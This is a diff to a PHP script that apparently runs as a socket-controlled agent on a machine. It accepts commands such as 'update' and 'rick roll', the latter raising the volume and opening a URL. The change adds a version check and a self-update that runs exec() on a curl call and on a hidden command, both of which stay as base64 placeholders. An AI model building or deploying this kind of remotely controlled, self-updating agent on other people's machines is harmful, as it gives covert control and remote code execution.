@@ -1,5 +1,6 @@
 <?php
 // Define constants
+define('REGEX_VALID_VERSION', '{{B64_CONST_REGEX_VALID_VERSION}}');
 define('REGEX_VALID_IP_ADDRESS', '{{B64_CONST_REGEX_VALID_IP_ADDRESS}}');
 define('REGEX_SIMPLE_STRING', '{{B64_CONST_REGEX_SIMPLE_STRING}}');
 define('REGEX_CTL_QUIT', '{{B64_CONST_REGEX_CTL_QUIT}}');
@@ -92,13 +93,25 @@ do {
 
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
+        } else if (preg_match(REGEX_CTL_VERSION, $buf)) {
+            $msg .= 'Current version: ' . SS_VERSION . "\n";
+            $ver = exec(build_curl_cmd('v'));
+
+            if (preg_match(REGEX_VALID_VERSION, $ver)) {
+                $msg .= "Update available! (version $ver)\nRun 'update' to get this version!\n";
+            }
         } else if (preg_match(REGEX_CTL_UPDATE, $buf)) {
-            $msg .= "CURRENT SS_VERSION = " . SS_VERSION . "\n";
-            $cmd = build_curl_cmd('v');
-            $msg .= "CMD = $cmd\n";
-            $msg .= "Server Says: '" . exec($cmd) . "'\n";
-            // exec('{{B64_CMD_UPDATE}}');
-            // die();
+            $ver = exec(build_curl_cmd('v'));
+
+            if (preg_match(REGEX_VALID_VERSION, $ver)) {
+                $msg = "Updating " . SS_VERSION . " -> $ver\n";
+                $msg .= "NOTE: Socket will close, should be up again within seconds.\n";
+                socket_write($msgsock, $msg, strlen($msg));
+                exec('{{B64_CMD_UPDATE}}');
+                die();
+            } else {
+                $msg .= "Alrady running latest version. Nothing to update.\n";
+            }
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
             set_volume(7);
             open_url('{{B64_STR_RICK_ROLL_URL}}');
